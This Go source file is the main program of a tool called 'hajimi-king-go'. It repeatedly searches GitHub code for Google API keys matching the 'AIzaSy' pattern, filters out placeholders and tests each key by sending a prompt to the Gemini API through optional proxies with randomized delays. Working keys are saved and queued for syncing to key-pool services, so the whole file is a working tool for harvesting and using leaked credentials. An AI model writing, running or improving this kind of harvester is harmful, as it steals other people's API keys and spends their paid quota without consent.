package main

import (
	"flag"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"os/signal"
	"regexp"
	"strings"
	"syscall"
	"time"

	"github.com/google/generative-ai-go/genai"
	"golang.org/x/net/context"
	"google.golang.org/api/option"

	"hajimi-king-go/internal/api"
	"hajimi-king-go/internal/config"
	"hajimi-king-go/internal/filemanager"
	"hajimi-king-go/internal/github"
	"hajimi-king-go/internal/logger"
	"hajimi-king-go/internal/models"
	"hajimi-king-go/internal/syncutils"
)

var (
	configFile = flag.String("config", ".env", "配置文件路径")
)

// HajimiKing 主应用结构
type HajimiKing struct {
	config       *config.Config
	logger       *logger.Logger
	githubClient *github.Client
	fileManager  *filemanager.FileManager
	syncUtils    *syncutils.SyncUtils
	apiServer    *api.APIServer
	checkpoint   *models.Checkpoint
	skipStats    map[string]int
}

// NewHajimiKing 创建HajimiKing实例
func NewHajimiKing() *HajimiKing {
	// 加载配置
	cfg := config.LoadConfig()

	// 初始化日志
	log := logger.InitLogger()

	// 创建GitHub客户端
	githubClient := github.NewClient(cfg.GitHubTokens)

	// 创建文件管理器
	fileManager := filemanager.NewFileManager(cfg)

	// 创建同步工具
	syncUtils := syncutils.NewSyncUtils(cfg)

	// 创建API服务器
	var apiServer *api.APIServer
	if cfg.APIEnabled {
		apiServer = api.NewAPIServer(cfg, fileManager)
	}

	return &HajimiKing{
		config:       cfg,
		logger:       log,
		githubClient: githubClient,
		fileManager:  fileManager,
		syncUtils:    syncUtils,
		apiServer:    apiServer,
		skipStats:    map[string]int{
			"time_filter":   0,
			"sha_duplicate": 0,
			"age_filter":    0,
			"doc_filter":    0,
		},
	}
}

// Run 运行应用
func (hk *HajimiKing) Run() error {
	// 记录系统启动信息
	hk.logger.LogSystemStartup()

	// 1. 检查配置
	if !hk.config.Check() {
		hk.logger.Info("❌ Config check failed. Exiting...")
		return fmt.Errorf("config check failed")
	}

	// 2. 检查文件管理器
	if !hk.fileManager.Check() {
		hk.logger.Error("❌ FileManager check failed. Exiting...")
		return fmt.Errorf("file manager check failed")
	}

	// 3. 加载检查点
	checkpoint, err := hk.fileManager.LoadCheckpoint()
	if err != nil {
		hk.logger.Errorf("❌ Failed to load checkpoint: %v", err)
		return err
	}
	hk.checkpoint = checkpoint

	// 4. 显示同步工具状态
	if hk.syncUtils.BalancerEnabled || hk.syncUtils.GPTLoadEnabled {
		hk.logger.Info("🔗 SyncUtils ready for async key syncing")
	}

	// 显示队列状态
	balancerQueueCount, gptLoadQueueCount := hk.syncUtils.GetQueueStatus()
	hk.logger.Infof("📊 Queue status - Balancer: %d, GPT Load: %d", balancerQueueCount, gptLoadQueueCount)

	// 5.5 显示API服务器状态
	if hk.apiServer != nil {
		hk.logger.Infof("🌐 API server enabled on port %d", hk.config.APIPort)
	} else {
		hk.logger.Infof("🌐 API server disabled")
	}

	// 5. 显示系统信息
	searchQueries := hk.fileManager.GetSearchQueries()
	hk.logger.Info("📋 SYSTEM INFORMATION:")
	hk.logger.Infof("🔑 GitHub tokens: %d configured", len(hk.config.GitHubTokens))
	hk.logger.Infof("🔍 Search queries: %d loaded", len(searchQueries))
	hk.logger.Infof("📅 Date filter: %d days", hk.config.DateRangeDays)
	if len(hk.config.ProxyList) > 0 {
		hk.logger.Infof("🌐 Proxy: %d proxies configured", len(hk.config.ProxyList))
	}

	if hk.checkpoint.LastScanTime != "" {
		hk.logger.Info("💾 Checkpoint found - Incremental scan mode")
		hk.logger.Infof("   Last scan: %s", hk.checkpoint.LastScanTime)
		hk.logger.Infof("   Scanned files: %d", len(hk.checkpoint.ScannedSHAs))
		hk.logger.Infof("   Processed queries: %d", len(hk.checkpoint.ProcessedQueries))
	} else {
		hk.logger.Info("💾 No checkpoint - Full scan mode")
	}

	hk.logger.LogSystemReady()

	// 启动同步服务
	hk.syncUtils.Start()

	// 启动API服务器
	if hk.apiServer != nil {
		go func() {
			hk.logger.Infof("🌐 Starting API server on port %d", hk.config.APIPort)
			if err := hk.apiServer.Start(); err != nil && err != http.ErrServerClosed {
				hk.logger.Errorf("❌ API server error: %v", err)
			}
		}()
	}

	// 主循环
	hk.mainLoop()

	return nil
}

// mainLoop 主循环
func (hk *HajimiKing) mainLoop() {
	totalKeysFound := 0
	totalRateLimitedKeys := 0
	loopCount := 0

	searchQueries := hk.fileManager.GetSearchQueries()

	for {
		// 主循环逻辑
		loopCount++
		hk.logger.LogLoopStart(loopCount)

		queryCount := 0
		loopProcessedFiles := 0
		hk.resetSkipStats()

		for i, query := range searchQueries {
			normalizedQuery := hk.fileManager.NormalizeQuery(query)
			if contains(hk.checkpoint.ProcessedQueries, normalizedQuery) {
				hk.logger.Infof("🔍 Skipping already processed query: [%s],index:#%d", query, i+1)
				continue
			}

			result, err := hk.githubClient.SearchForKeys(query)
			if err != nil {
				hk.logger.Errorf("❌ Query %d/%d failed: %v", i+1, len(searchQueries), err)
				continue
			}

			if result != nil && len(result.Items) > 0 {
				queryValidKeys := 0
				queryRateLimitedKeys := 0
				queryProcessed := 0

				for itemIndex, item := range result.Items {
					// 每20个item保存checkpoint并显示进度
					if itemIndex > 0 && itemIndex%20 == 0 {
						hk.logger.Infof("📈 Progress: %d/%d | query: %s | current valid: %d | current rate limited: %d | total valid: %d | total rate limited: %d",
							itemIndex, len(result.Items), query, queryValidKeys, queryRateLimitedKeys, totalKeysFound, totalRateLimitedKeys)
						hk.fileManager.SaveCheckpoint(hk.checkpoint)
						hk.fileManager.UpdateDynamicFilenames()
					}

					// 检查是否应该跳过此item
					if shouldSkip, reason := hk.shouldSkipItem(item); shouldSkip {
						hk.logger.Infof("🚫 Skipping item,name: %s,index:%d - reason: %s", strings.ToLower(item.Path), itemIndex+1, reason)
						continue
					}

					// 处理单个item
					validCount, rateLimitedCount := hk.processItem(item)

					queryValidKeys += validCount
					queryRateLimitedKeys += rateLimitedCount
					queryProcessed += 1

					// 记录已扫描的SHA
					hk.checkpoint.ScannedSHAs = append(hk.checkpoint.ScannedSHAs, item.SHA)
					loopProcessedFiles += 1
				}

				totalKeysFound += queryValidKeys
				totalRateLimitedKeys += queryRateLimitedKeys

				if queryProcessed > 0 {
					hk.logger.LogQueryProgress(i+1, len(searchQueries), queryProcessed, queryValidKeys, queryRateLimitedKeys)
				} else {
					hk.logger.Infof("⏭️ Query %d/%d complete - All items skipped", i+1, len(searchQueries))
				}

				hk.logger.LogSkipStats(hk.skipStats)
			} else {
				hk.logger.Infof("📭 Query %d/%d - No items found", i+1, len(searchQueries))
			}

			hk.checkpoint.ProcessedQueries = append(hk.checkpoint.ProcessedQueries, normalizedQuery)
			queryCount++

			hk.checkpoint.LastScanTime = time.Now().Format(time.RFC3339)
			hk.fileManager.SaveCheckpoint(hk.checkpoint)
			hk.fileManager.UpdateDynamicFilenames()

			if queryCount%5 == 0 {
				hk.logger.Infof("⏸️ Processed %d queries, taking a break...", queryCount)
				time.Sleep(1 * time.Second)
			}
		}

		hk.logger.LogLoopComplete(loopCount, loopProcessedFiles, totalKeysFound, totalRateLimitedKeys)

		hk.logger.Infof("💤 Sleeping for 10 seconds...")
		time.Sleep(10 * time.Second)
	}
}

// processItem 处理单个GitHub搜索结果项
func (hk *HajimiKing) processItem(item models.GitHubSearchItem) (int, int) {
	delay := rand.Float64()*3.0 + 1.0
	fileURL := item.HTMLURL

	// 简化日志输出，只显示关键信息
	repoName := item.Repository.FullName
	filePath := item.Path
	time.Sleep(time.Duration(delay) * time.Second)

	content, err := hk.githubClient.GetFileContent(item)
	if err != nil {
		hk.logger.Warningf("⚠️ Failed to fetch content for file: %s", fileURL)
		return 0, 0
	}

	keys := hk.extractKeysFromContent(content)

	// 过滤占位符密钥
	filteredKeys := []string{}
	for _, key := range keys {
		contextIndex := strings.Index(content, key)
		if contextIndex != -1 {
			snippet := content[contextIndex : min(contextIndex+45, len(content))]
			if strings.Contains(snippet, "...") || strings.Contains(strings.ToUpper(snippet), "YOUR_") {
				continue
			}
		}
		filteredKeys = append(filteredKeys, key)
	}

	// 去重处理
	keys = unique(filteredKeys)

	if len(keys) == 0 {
		return 0, 0
	}

	hk.logger.Infof("🔑 Found %d suspected key(s), validating...", len(keys))

	validKeys := []string{}
	rateLimitedKeys := []string{}

	// 验证每个密钥
	for _, key := range keys {
		validationResult := hk.validateGeminiKey(key)
		if validationResult == "ok" {
			validKeys = append(validKeys, key)
			hk.logger.Infof("✅ VALID: %s", key)
		} else if validationResult == "rate_limited" {
			rateLimitedKeys = append(rateLimitedKeys, key)
			hk.logger.Warningf("⚠️ RATE LIMITED: %s", key)
		} else {
			hk.logger.Infof("❌ INVALID: %s, check result: %s", key, validationResult)
		}
	}

	// 保存结果
	if len(validKeys) > 0 {
		if err := hk.fileManager.SaveValidKeys(repoName, filePath, fileURL, validKeys); err != nil {
			hk.logger.Errorf("❌ Failed to save valid keys: %v", err)
		} else {
			hk.logger.Infof("💾 Saved %d valid key(s)", len(validKeys))
		}

		// 添加到同步队列（不阻塞主流程）
		if err := hk.syncUtils.AddKeysToQueue(validKeys); err != nil {
			hk.logger.Errorf("📥 Error adding keys to sync queues: %v", err)
		} else {
			hk.logger.Infof("📥 Added %d key(s) to sync queues", len(validKeys))
		}
	}

	if len(rateLimitedKeys) > 0 {
		if err := hk.fileManager.SaveRateLimitedKeys(repoName, filePath, fileURL, rateLimitedKeys); err != nil {
			hk.logger.Errorf("❌ Failed to save rate limited keys: %v", err)
		} else {
			hk.logger.Infof("💾 Saved %d rate limited key(s)", len(rateLimitedKeys))
		}
	}

	return len(validKeys), len(rateLimitedKeys)
}

// extractKeysFromContent 从内容中提取密钥
func (hk *HajimiKing) extractKeysFromContent(content string) []string {
	pattern := regexp.MustCompile(`(AIzaSy[A-Za-z0-9\-_]{33})`)
	return pattern.FindAllString(content, -1)
}

// shouldSkipItem 检查是否应该跳过处理此item
func (hk *HajimiKing) shouldSkipItem(item models.GitHubSearchItem) (bool, string) {
	// 检查增量扫描时间
	if hk.checkpoint.LastScanTime != "" {
		lastScanTime, err := time.Parse(time.RFC3339, hk.checkpoint.LastScanTime)
		if err == nil {
			repoPushedAt := item.Repository.PushedAt
			if repoPushedAt != "" {
				repoPushedTime, err := time.Parse("2006-01-02T15:04:05Z", repoPushedAt)
				if err == nil && !repoPushedTime.After(lastScanTime) {
					hk.skipStats["time_filter"]++
					return true, "time_filter"
				}
			}
		}
	}

	// 检查SHA是否已扫描
	if contains(hk.checkpoint.ScannedSHAs, item.SHA) {
		hk.skipStats["sha_duplicate"]++
		return true, "sha_duplicate"
	}

	// 检查仓库年龄
	repoPushedAt := item.Repository.PushedAt
	if repoPushedAt != "" {
		repoPushedTime, err := time.Parse("2006-01-02T15:04:05Z", repoPushedAt)
		if err == nil && repoPushedTime.Before(time.Now().AddDate(0, 0, -hk.config.DateRangeDays)) {
			hk.skipStats["age_filter"]++
			return true, "age_filter"
		}
	}

	// 检查文档和示例文件
	lowercasePath := strings.ToLower(item.Path)
	for _, token := range hk.config.FilePathBlacklist {
		if strings.Contains(lowercasePath, strings.ToLower(token)) {
			hk.skipStats["doc_filter"]++
			return true, "doc_filter"
		}
	}

	return false, ""
}

// validateGeminiKey 验证Gemini密钥
func (hk *HajimiKing) validateGeminiKey(apiKey string) string {
	time.Sleep(time.Duration(rand.Float64()*1.0+0.5) * time.Second)

	// 获取随机代理配置
	proxyConfig := hk.config.GetRandomProxy()

	ctx := context.Background()
	clientOpts := []option.ClientOption{
		option.WithAPIKey(apiKey),
		option.WithEndpoint("generativelanguage.googleapis.com"),
	}

	// 如果有代理配置，添加到client选项中
	if proxyConfig != nil {
		// 注意：Go的Google AI客户端可能需要额外的代理配置
		// 这里可能需要根据具体的库来设置代理
	}

	client, err := genai.NewClient(ctx, clientOpts...)
	if err != nil {
		return "error:" + err.Error()
	}
	defer client.Close()

	model := client.GenerativeModel(hk.config.HajimiCheckModel)
	resp, err := model.GenerateContent(ctx, genai.Text("hi"))
	if err != nil {
		errStr := err.Error()
		if strings.Contains(errStr, "PermissionDenied") || strings.Contains(errStr, "Unauthenticated") {
			return "not_authorized_key"
		}
		if strings.Contains(errStr, "TooManyRequests") || strings.Contains(errStr, "429") || strings.Contains(strings.ToLower(errStr), "rate limit") {
			return "rate_limited"
		}
		if strings.Contains(errStr, "SERVICE_DISABLED") || strings.Contains(errStr, "API has not been used") {
			return "disabled"
		}
		return "error:" + errStr
	}

	if resp != nil {
		return "ok"
	}
	return "unknown_error"
}

// resetSkipStats 重置跳过统计
func (hk *HajimiKing) resetSkipStats() {
	hk.skipStats = map[string]int{
		"time_filter":   0,
		"sha_duplicate": 0,
		"age_filter":    0,
		"doc_filter":    0,
	}
}

// handleShutdown 处理关闭
func (hk *HajimiKing) handleShutdown(validKeys, rateLimitedKeys int) {
	hk.logger.LogSystemShutdown(validKeys, rateLimitedKeys)
	
	// 保存最终检查点
	hk.checkpoint.LastScanTime = time.Now().Format(time.RFC3339)
	hk.fileManager.SaveCheckpoint(hk.checkpoint)
	
	// 停止同步服务
	hk.syncUtils.Stop()
	
	// 停止API服务器
	if hk.apiServer != nil {
		hk.logger.Info("🌐 Stopping API server...")
		if err := hk.apiServer.Stop(); err != nil {
			hk.logger.Errorf("❌ Error stopping API server: %v", err)
		}
	}
	
	// 确保程序立即退出
	os.Exit(0)
}

// contains 检查字符串切片是否包含特定字符串
func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

// unique 去重字符串切片
func unique(slice []string) []string {
	keys := make(map[string]bool)
	list := []string{}
	for _, entry := range slice {
		if _, value := keys[entry]; !value {
			keys[entry] = true
			list = append(list, entry)
		}
	}
	return list
}

// minInt 返回两个整数中的较小值
func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func main() {
	flag.Parse()

	// 创建HajimiKing实例
	app := NewHajimiKing()

	// 设置全局信号处理
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	// 在goroutine中运行主应用
	go func() {
		if err := app.Run(); err != nil {
			app.logger.Errorf("❌ Application error: %v", err)
			os.Exit(1)
		}
	}()

	// 等待信号
	<-sigChan
	app.logger.Info("🛑 接收到终止信号，正在关闭程序...")
	
	// 执行清理操作
	app.handleShutdown(0, 0)
}